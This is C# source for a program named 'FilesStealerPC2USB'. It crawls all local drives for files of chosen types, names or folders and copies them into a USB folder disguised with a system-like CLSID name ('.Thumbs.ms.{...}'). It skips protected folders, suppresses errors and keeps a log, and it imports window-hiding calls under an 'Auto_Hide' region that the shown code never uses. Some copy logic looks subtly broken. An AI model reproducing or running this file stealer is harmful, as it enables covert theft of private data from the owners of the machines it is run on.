using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace FilesStealerPC2USB
{
    class Program
    {
        #region Auto_Hide
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();


        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        #endregion

        #region First variable
        static string Favorite_USBLoc;static string CDrom;
        

        static string OS_search = ""; static string message = ""; static string countnumShow = ""; static string have_log = ""; static string contain = "no";
        static string[] exceptdrive; static string[] listertype; static string[] listerfile; static string[] listerfolder; static int count = 0;
        private static string destLog = ".\\" + "types.txt"; static string dest = "";
        static string favorite = ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}";

        //List<string> log = new List<string>();
        #endregion

        static void Main(string[] args)
        {


            //Alaki alaki = new Alaki();
            //alaki.Start();

            Start();

            Console.WriteLine("\n===========\nStatus     | Done!");
            Console.ReadLine();
        }

        static void Start()
        {
            #region First question
            if (Directory.GetFiles(".").Contains(destLog) == false)
            {
                Console.WriteLine("====\nThere is no [type.txt] file in this directory, copy it here and re-open the program.\nAlso you can answer these questions(hit Enter without anything typed to skip a question. Seperate items with :  ,  )\n====");

                Console.Write("Do you want program to search in os drive/folder(s) ? (yes\\no)\n > ");
                OS_search = Console.ReadLine().Replace(" ", "");

                Console.Write("Which type-file do you want to be copied ? (hit Enter for nothing)\n > ");
                string listertype_ = Console.ReadLine().Replace(" ", "").Replace(".", "");

                Console.Write("What files do you want to be copied ? (hit Enter for nothing)\n > ");
                string listerfile_ = Console.ReadLine();

                Console.Write("What folders do you want to be copied ? (hit Enter for nothing)\n > ");
                string listerfolder_ = Console.ReadLine();

                Console.Write("What drives \"don't\" you want to be copied ? (hit Enter for nothing)\n > ");
                string exceptdrive_ = Console.ReadLine().Replace(" ", "");

                Console.Write("What message do you want to be shown ? (hit Enter for nothing)\n > ");
                message = Console.ReadLine();

                Console.Write("Do you want numbers of files to be counted ? (yes\\no)\n > ");
                countnumShow = Console.ReadLine().Replace(" ", ""); ;

                Console.Write("Do you want to have log-file ? (yes\\no)\n > ");
                have_log = Console.ReadLine().Replace(" ", ""); ;

                Console.Write("Do you want to search file names exactly what entered(yes) or containing is also fine(no) ? (yes\\no)\n > ");
                contain = Console.ReadLine().Replace(" ", "");

                Console.Write("\nAll done. Let's go for real challenge...\n==========================\n");

                string to_write = "[Basic]\ntypes=" + listertype_ + "\nfiles=" + listerfile_ + "\nfolders=" + listerfolder_ +
                      "\nsearch_OS_drive=" + OS_search + "\n\n[Advanced]\nexceptDrive=" + exceptdrive_ +
                      "\nmessage=" + message + "\ncountNumberShow=" + countnumShow + "\nlog=" + have_log + "contain="+contain+
                      "\n\n\nNote:\nyou can seperate items with	                 : ,\nSearch_OS_drive,CountnumShow, and Log should be	 : yes\\no";

                File.WriteAllText(destLog, to_write);
            }
            #endregion

            string[] reader = File.ReadAllLines(destLog);

            #region Reader
            foreach (string read in reader)
            {
                if (read.Contains("search_OS_drive="))
                {
                    OS_search = read.Replace(" ", "").Replace("\n", "").Replace("search_OS_drive=", "").ToLower();
                }
                else if (read.Contains("types="))
                {
                    listertype = read.Replace("types=", "").Replace(" , ", "").Replace("\n", "").Replace(" ,", ",").Replace(", ", ",").ToLower().Split(",");
                }
                else if (read.Contains("files="))
                {
                    listerfile = read.Replace("files=", "").Replace(" , ", "").Replace("\n", "").Replace(" ,", ",").Replace(", ", ",").ToLower().Split(",");
                }
                else if (read.Contains("folders="))
                {
                    listerfolder = read.Replace("folders=", "").Replace(" , ", "").Replace("\n", "").Replace(" ,", ",").Replace(", ", ",").ToLower().Split(",");
                }
                else if (read.Contains("exceptDrive="))
                {
                    exceptdrive = read.Replace("exceptDrive=", "").Replace(":", "").Replace("\\", "").Replace(" , ", "").Replace("\n", "").Replace(" ,", ",").Replace(", ", ",").ToLower().Split(",");
                }
                else if (read.Contains("message="))
                {
                    message = read.Replace("message=", "").Replace("\n", "") + "\n";
                }
                else if (read.Contains("countNumberShow="))
                {
                    countnumShow = read.Replace("countNumberShow=", "").Replace("\n", "").ToLower();
                }
                else if (read.Contains("log="))
                {
                    have_log = read.Replace("log=", "").Replace("\n", "").ToLower();
                }
                else if (read.Contains("contain="))
                {
                    contain = read.Replace("contain=", "").Replace("\n", "").ToLower();
                }
            }
            #endregion

            #region Drives
            string[] exdrive = { };
            foreach (string drive in exceptdrive)
            {
                exdrive = exdrive.Concat(new string[] { drive.ToUpper()+":\\" }).ToArray();
            }

            string[] DrivesLocs = LocalDriveLoc(exdrive);

            string WinDrive = Path.GetPathRoot(Environment.SystemDirectory);

            if (OS_search != "yes")
            {
                DrivesLocs = DrivesLocs.Where(val => val != WinDrive).ToArray();
            }
            #endregion

            #region USB
            Favorite_USBLoc = UsbDriveLoc();
            CDrom = CD_DriveLoc();
            DrivesLocs = DrivesLocs.Where(val => val != Favorite_USBLoc).ToArray();
            DrivesLocs = DrivesLocs.Where(val => val != CDrom).ToArray();

            if (Directory.GetDirectories(".").Contains(".\\" + favorite))
            {
                dest = Directory.GetDirectoryRoot(".") + favorite + "\\";
            }
            else
            {
                if (Favorite_USBLoc == "")
                {
                    Console.WriteLine("\n###########\nStatus     | No F-USB Connected!!!\n###########\n");
                    Console.ReadKey();
                    Environment.Exit(0);
                }
                else
                {
                    dest = Favorite_USBLoc + favorite + "\\";
                }

            }
            #endregion

            Console.WriteLine("Status     | Ready\n===========\n");

            if (message != "")
            {
                Console.WriteLine(message);
            }

            //time
            DateTime start = DateTime.Now;

            foreach (string drive in DrivesLocs)
            {
                Console.WriteLine("Working... | "+ drive);
                Copier(drive);
                Console.WriteLine("Done!      | " + drive);
            }

            DateTime end = DateTime.Now;
            TimeSpan Time = end - start;

            Console.WriteLine("\nTime       | " + Time);
            Console.WriteLine("Files      | " + count);

            File.WriteAllText(dest + "Log.txt", "#####Result#####");
            File.AppendAllText(dest + "Log.txt", Structure());
        }


        public static string[] GetDirectories_(string drive)
        {
            string[] driveToReturn = { };

            var DirsFound = Directory.GetDirectories(drive, "*", SearchOption.TopDirectoryOnly);

            string[] Errors = { "$recycle.bin", "system volume information", "$winreagent", "config.msi", "documents and settings", ".trash-1000", "found.000" };

            foreach (string dir in DirsFound)
            {
                if (Errors.Contains(dir.Replace(drive, "").ToLower()) == false)
                {
                    driveToReturn = driveToReturn.Concat(new string[] { dir }).ToArray();
                }
            }
            return driveToReturn;
        }


        private static List<string> GetFiles_(string path, string pattern)
        {
            var files = new List<string>();
            var directories = new string[] { };

            try
            {
                files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
                directories = Directory.GetDirectories(path);

            }
            catch (UnauthorizedAccessException) { }

            foreach (var directory in directories)
            {
                try
                {
                    files.AddRange(GetFiles_(directory, pattern));
                }
                catch (UnauthorizedAccessException) { }

            }
            return files;
        }

        public static string UsbDriveLoc()
        {
            string driveLoc = "";

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Removable && Directory.GetDirectories(drive.Name).Contains(drive.Name + favorite))
                    driveLoc = drive.Name;
            }
            return driveLoc;
        }

        public static string CD_DriveLoc()
        {
            string driveLoc = "";

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.CDRom)
                    driveLoc = drive.Name;
            }
            return driveLoc;
        }

        #region Name Recognizing
        public static string Reverse_(string GotString)
        {
            char[] charArray = GotString.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }
        public static string NameRecognizer(string Name)
        {
            char[] news = { };
            int i = 1;
            while (i <= Name.Length)
            {
                if (Name[^i].ToString() != "\\")
                {
                    news = news.Concat(new char[] { Name[^i] }).ToArray();
                }
                else
                {
                    break;
                }
                i++;
            }
            string NameToReturn = new string(news);
            return Reverse_(NameToReturn);
        }
        #endregion


        public static string[] LocalDriveLoc(string[] ExDrive)
        {
            string[] localDrives = { };

            foreach (var drive in Directory.GetLogicalDrives())
            {
                if (ExDrive.Contains(drive) == false && drive != "G:\\" && drive != Favorite_USBLoc && drive != "H:\\") // && Directory.get.Contains(drive)
                    localDrives = localDrives.Concat(new string[] { drive }).ToArray();
            }
            return localDrives;
        }



        #region Copy
        public static void Copier(string drive)
        {
            //Console.WriteLine(drive + " ...");

            #region Search by type
            if (listertype.Length != 0)
            {
                foreach (string type in listertype)
                {
                    foreach (string dir in GetDirectories_(drive))
                    {
                        string[] FilesInDir = GetFiles_(dir, "*." + type).ToArray();
                        foreach (string foundFile in FilesInDir)
                        {
                            string name = NameRecognizer(foundFile);
                            Directory.CreateDirectory(dest + foundFile.Replace(name, "").Replace(":", ""));
                            try
                            {
                                File.Copy(foundFile, dest + foundFile.Replace(":", ""), true);
                                count++;
                            }
                            catch (IOException) { }
                        }
                    }
                }
            }


            #endregion

            #region Search by files name
            if (listerfile.Length != 0)
            {
                string fileFormat;
                foreach (string file in listerfile)
                {
                    if (contain == "yes")
                    {
                        fileFormat = "*" + file + "*.*";
                    }
                    else
                    {
                        fileFormat = file + ".*";
                    }

                    string[] FilesInDir = GetFiles_(drive,fileFormat).ToArray();
                    foreach (string foundFile in FilesInDir)
                    {
                        string name = NameRecognizer(foundFile);
                        Directory.CreateDirectory(dest + foundFile.Replace(name,"").Replace(":", ""));
                        try
                        {
                            File.Copy(foundFile, dest + foundFile.Replace(":", ""), true);
                            count++;
                        }
                        catch (IOException) { }
                   }

                }
            }

            #endregion

            #region Search by folders name
            if (listerfolder.Length != 0)
            {
                foreach (string folder in listerfolder)
                {
                    string[] DirToSearch = GetDirectories_(drive);

                    //Search TopFolders in Drive
                    if (DirToSearch.Contains(drive + folder))
                    {
                        string[] FilesInDir = GetFiles_((drive + folder), "*.*").ToArray();

                        foreach (string foundFile in FilesInDir)
                        {
                            string name = NameRecognizer(foundFile);
                            Directory.CreateDirectory(dest + foundFile.Replace(":", "").Replace(name,""));
                            File.Copy(foundFile, dest + foundFile.Replace(":", ""), true);
                            count++;
                        }
                    }

                    foreach (string dir in DirToSearch)
                    {
                        try
                        {
                            var DirsFound = Directory.GetDirectories(dir, folder, SearchOption.AllDirectories);
                            foreach (string DirName in DirsFound)
                            {
                                string[] FilesInDir = GetFiles_(DirName, "*.*").ToArray();

                                foreach (string foundFile in FilesInDir)
                                {
                                    Directory.CreateDirectory(dest + foundFile.Replace(":", ""));
                                    File.Copy(foundFile, dest + foundFile.Replace(":", ""), true);
                                    count++;
                                }
                            }
                        }
                        catch (UnauthorizedAccessException) { }
                    }
                }
            }
            #endregion

            #endregion


        }

        public static string Structure()
        {
            string structure = "\n==========Search==========\nSearched for these folders    : " + string.Join(",", listerfolder) + "\nSearched for these file-types : " + 
                                string.Join(",", listertype) + "\nSearched for these files      : " + string.Join(" ", listerfile) + "Search os drive(folders)      : " + OS_search.Replace("-os", "").ToLower() + "\nExcept drives                 : " +
                                string.Join(",", exceptdrive) + "\nAll files:                    : " + count.ToString();

            return structure;
        }

    }
}